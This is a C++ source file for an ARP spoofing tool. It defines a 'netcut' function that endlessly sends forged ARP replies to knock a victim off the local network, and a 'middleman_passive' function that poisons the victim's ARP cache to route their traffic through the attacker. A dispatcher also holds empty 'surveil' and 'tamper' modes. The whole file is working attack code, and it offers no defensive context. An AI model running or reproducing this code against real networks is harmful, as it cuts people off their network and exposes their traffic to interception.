#include "attacker.h"

void netcut(
    const int fd,
    const std::string& if_name,
    const std::string& victim_mac,
    const std::string& victim_ip,
    const std::string& pretending_ip,
    int interval_time
) {
    char if_name_c[IF_NAMESIZE] = "";
    strncpy(if_name_c, if_name.c_str(), IF_NAMESIZE);

    ether_addr sha = *ether_aton("00:00:00:00:00:00");
    in_addr spa = { inet_addr(pretending_ip.c_str()) };
    ether_addr tha = *ether_aton(victim_mac.c_str());
    in_addr tpa = { inet_addr(victim_ip.c_str()) };

    arp_frame arp_reply = make_arp_reply(&sha, &spa, &tha, &tpa);

    while(1) {
        send_arp_to(fd, if_name_c, &arp_reply);
        std::this_thread::sleep_for(std::chrono::seconds(interval_time));
    }
}

void middleman_passive(
    const int fd,
    const std::string& if_name,
    const std::string& victim_mac,
    const std::string& victim_ip,
    const std::string& pretending_mac,
    const std::string& pretending_ip,
    int interval_time
) {
    char if_name_c[IF_NAMESIZE] = "";
    strncpy(if_name_c, if_name.c_str(), IF_NAMESIZE);

    ether_addr sha = *ether_aton(pretending_mac.c_str());
    in_addr spa = { inet_addr(pretending_ip.c_str()) };
    ether_addr tha = *ether_aton(victim_mac.c_str());
    in_addr tpa = { inet_addr(victim_ip.c_str()) };

    arp_frame arp_reply = make_arp_reply(&sha, &spa, &tha, &tpa);

    while(1) {
        send_arp_to(fd, if_name_c, &arp_reply);
        std::this_thread::sleep_for(std::chrono::seconds(interval_time));
    }
}
void attacker_thread(
    const int fd, 
    const std::string& if_name, 
    const std::string& type, 
    const std::string& victim_mac,
    const std::string& victim_ip,
    const std::string& pretending_mac,
    const std::string& pretending_ip,
    int interval_time
) {
    if(type == "netcut") {
        netcut(fd, if_name, victim_mac, victim_ip, pretending_ip, interval_time);
    } else if (type == "intercept") {
        middleman_passive(fd, if_name, victim_mac, victim_ip, pretending_mac, pretending_ip, interval_time);
    } else if(type == "surveil") {

    } else if (type == "tamper") {

    }
}